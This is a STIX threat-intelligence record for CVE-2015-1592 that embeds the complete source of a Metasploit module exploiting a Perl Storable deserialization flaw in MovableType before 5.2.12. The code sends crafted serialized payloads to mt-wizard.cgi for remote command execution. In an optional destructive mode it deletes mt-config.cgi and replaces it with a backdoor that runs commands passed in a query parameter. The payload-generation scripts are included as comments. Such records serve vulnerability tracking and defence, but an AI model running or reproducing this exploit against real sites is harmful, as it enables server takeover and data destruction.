{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1ef438fa-87d5-476a-bede-16c1308fc9f4",
    "created": "2024-08-14T17:12:58.42377Z",
    "modified": "2024-08-14T17:12:58.423774Z",
    "name": "SixApart MovableType Storable Perl Code Execution",
    "description": " This module exploits a serialization flaw in MovableType before 5.2.12 to execute arbitrary code. The default nondestructive mode depends on the target server having the Object::MultiType and DateTime Perl modules installed in Perl's @INC paths. The destructive mode of operation uses only required MovableType dependencies but it will noticeably corrupt the MovableType installation. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/sixapart_movabletype_storable_exec.rb",
            "external_id": "sixapart_movabletype_storable_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-1592"
        },
        {
            "source_name": "reference",
            "url": "https://movabletype.org/news/2015/02/movable_type_607_and_5212_released_to_close_security_vulnera.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'SixApart MovableType Storable Perl Code Execution',\n      'Description'    => %q{\n          This module exploits a serialization flaw in MovableType before 5.2.12 to execute\n          arbitrary code. The default nondestructive mode depends on the target server having\n          the Object::MultiType and DateTime Perl modules installed in Perl's @INC paths.\n          The destructive mode of operation uses only required MovableType dependencies,\n          but it will noticeably corrupt the MovableType installation.\n      },\n      'Author'         =>\n        [\n          'John Lightsey',\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2015-1592' ],\n          [ 'URL', 'https://movabletype.org/news/2015/02/movable_type_607_and_5212_released_to_close_security_vulnera.html' ],\n        ],\n      'Privileged'     => false, # web server context\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'BadChars'    => ' ',\n          'Space'       => 1024,\n        },\n      'Compat'         =>\n        {\n          'PayloadType' => 'cmd'\n        },\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [['Automatic', {}]],\n      'DisclosureDate' => '2015-02-11',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'MoveableType cgi-bin directory path', '/cgi-bin/mt/']),\n        OptBool.new('DESTRUCTIVE', [true, 'Use destructive attack method (more likely to succeed, but corrupts target system.)', false])\n      ], self.class\n    )\n\n  end\n\n=begin\n\n#!/usr/bin/perl\n\n# generate config parameters for injection checks\n\nuse Storable;\n\n{\n\n    package XXXCHECKXXX;\n\n    sub STORABLE_thaw {\n        return 1;\n    }\n\n    sub STORABLE_freeze {\n        return 1;\n    }\n\n}\n\nmy $check_obj = bless { ignore => 'this' }, XXXCHECKXXX;\nmy $frozen = 'SERG' . pack( 'N', 0 ) . pack( 'N', 3 ) . Storable::freeze({ x => $check_obj});\n$frozen = unpack 'H*', $frozen;\nprint \"LFI test for storable flaw is: $frozen\\n\";\n\n{\n    package DateTime;\n    use overload '+' => sub { 'ignored' };\n}\n\n=end\n\n  def check\n    vprint_status(\"Sending storable test injection for XXXCHECKXXX.pm load failure\")\n    res = send_request_cgi({\n        'method'    => 'GET',\n        'uri'       => normalize_uri(target_uri.path, 'mt-wizard.cgi'),\n        'vars_get' => {\n          '__mode' => 'retry',\n          'step'   => 'configure',\n          'config' => '53455247000000000000000304080831323334353637380408080803010000000413020b585858434845434b58585801310100000078'\n        }\n      })\n\n    unless res && res.code == 200 && res.body.include?(\"Can't locate XXXCHECKXXX.pm\")\n      vprint_error(\"Failed XXXCHECKXXX.pm load test\");\n      return Exploit::CheckCode::Safe\n    end\n    Exploit::CheckCode::Vulnerable\n  end\n\n  def exploit\n    if datastore['DESTRUCTIVE']\n      exploit_destructive\n    else\n      exploit_nondestructive\n    end\n  end\n\n=begin\n\n#!/usr/bin/perl\n\n# Generate nondestructive config parameter for RCE via Object::MultiType\n# and Try::Tiny. The generated value requires minor modification to insert\n# the payload inside the system() call and resize the padding.\n\nuse Storable;\n\n{\n    package Object::MultiType;\n    use overload '+' => sub { 'ingored' };\n}\n\n{\n    package Object::MultiType::Saver;\n}\n\n{\n    package DateTime;\n    use overload '+' => sub { 'ingored' };\n}\n\n{\n    package Try::Tiny::ScopeGuard;\n}\n\nmy $try_tiny_loader = bless {}, 'DateTime';\nmy $multitype_saver = bless { c => 'MT::run_app' }, 'Object::MultiType::Saver';\nmy $multitype_coderef = bless \\$multitype_saver, 'Object::MultiType';\nmy $try_tiny_executor = bless [$multitype_coderef, 'MT;print qq{Content-type: text/plain\\n\\n};system(q{});' . ('#' x 1025) . \"\\nexit;\"], 'Try::Tiny::ScopeGuard';\n\nmy $data = [$try_tiny_loader, $try_tiny_executor];\nmy $frozen = 'SERG' . pack( 'N', 0 ) . pack( 'N', 3 ) . Storable::freeze($data);\n$frozen = unpack 'H*', $frozen;\nprint \"RCE payload requiring Object::MultiType and DateTime: $frozen\\n\";\n\n=end\n\n  def exploit_nondestructive\n    print_status(\"Using nondestructive attack method\")\n    config_payload = \"53455247000000000000000304080831323334353637380408080802020000001411084461746554696d6503000000000411155472793a3a54696e793a3a53636f7065477561726402020000001411114f626a6563743a3a4d756c7469547970650411184f626a6563743a3a4d756c7469547970653a3a536176657203010000000a0b4d543a3a72756e5f6170700100000063013d0400004d543b7072696e742071717b436f6e74656e742d747970653a20746578742f706c61696e5c6e5c6e7d3b73797374656d28717b\"\n    config_payload <<  payload.encoded.unpack('H*')[0]\n    config_payload << \"7d293b\"\n    config_payload << \"23\" * (1025 - payload.encoded.length)\n    config_payload << \"0a657869743b\"\n\n    print_status(\"Sending payload (#{payload.raw.length} bytes)\")\n\n    send_request_cgi({\n      'method'    => 'GET',\n      'uri'       => normalize_uri(target_uri.path, 'mt-wizard.cgi'),\n      'vars_get' => {\n        '__mode' => 'retry',\n        'step'   => 'configure',\n        'config' => config_payload\n      }\n    }, 5)\n  end\n\n=begin\n\n#!/usr/bin/perl\n\n# Generate destructive config parameter to unlink mt-config.cgi\n\nuse Storable;\n\n{\n    package CGITempFile;\n}\n\nmy $unlink_target = \"mt-config.cgi\";\nmy $cgitempfile = bless \\$unlink_target, \"CGITempFile\";\n\nmy $data = [$cgitempfile];\nmy $frozen = 'SERG' . pack( 'N', 0 ) . pack( 'N', 3 ) . Storable::freeze($data);\n$frozen = unpack 'H*', $frozen;\nprint \"RCE unlink payload requiring CGI: $frozen\\n\";\n\n=end\n\n  def exploit_destructive\n    print_status(\"Using destructive attack method\")\n    # First we need to delete mt-config.cgi using the storable injection\n\n    print_status(\"Sending storable injection to unlink mt-config.cgi\")\n\n    res = send_request_cgi({\n      'method'    => 'GET',\n      'uri'       => normalize_uri(target_uri.path, 'mt-wizard.cgi'),\n      'vars_get' => {\n        '__mode' => 'retry',\n        'step'   => 'configure',\n        'config' => '534552470000000000000003040808313233343536373804080808020100000004110b43474954656d7046696c650a0d6d742d636f6e6669672e636769'\n      }\n    })\n\n    if res && res.code == 200\n      print_good(\"Successfully sent unlink request\")\n    else\n      fail_with(Failure::Unknown, \"Error sending unlink request\")\n    end\n\n    # Now we rewrite mt-config.cgi to accept a payload\n\n    print_status(\"Rewriting mt-config.cgi to accept the payload\")\n\n    res = send_request_cgi({\n      'method'    => 'GET',\n      'uri'       => normalize_uri(target_uri.path, 'mt-wizard.cgi'),\n      'vars_get'  => {\n        '__mode'             => 'next_step',\n        'step'               => 'optional',\n        'default_language'   => 'en_us',\n        'email_address_main' => \"x\\nObjectDriver mysql;use CGI;print qq{Content-type: text/plain\\\\n\\\\n};if(my $c = CGI->new()->param('xyzzy')){system($c);};unlink('mt-config.cgi');exit;1\",\n        'set_static_uri_to'  => '/',\n        'config'             => '5345524700000000000000024800000001000000127365745f7374617469635f66696c655f746f2d000000012f', # equivalent to 'set_static_file_to' => '/',\n      }\n    })\n\n    if res && res.code == 200\n      print_good(\"Successfully sent mt-config rewrite request\")\n    else\n      fail_with(Failure::Unknown, \"Error sending mt-config rewrite request\")\n    end\n\n    # Finally send the payload\n\n    print_status(\"Sending payload request\")\n\n    send_request_cgi({\n      'method'    => 'GET',\n      'uri'       => normalize_uri(target_uri.path, 'mt.cgi'),\n      'vars_get'  => {\n        'xyzzy'   => payload.encoded,\n      }\n    }, 5)\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-02-11",
    "x_mitre_platforms": [
        "['unix']"
    ]
}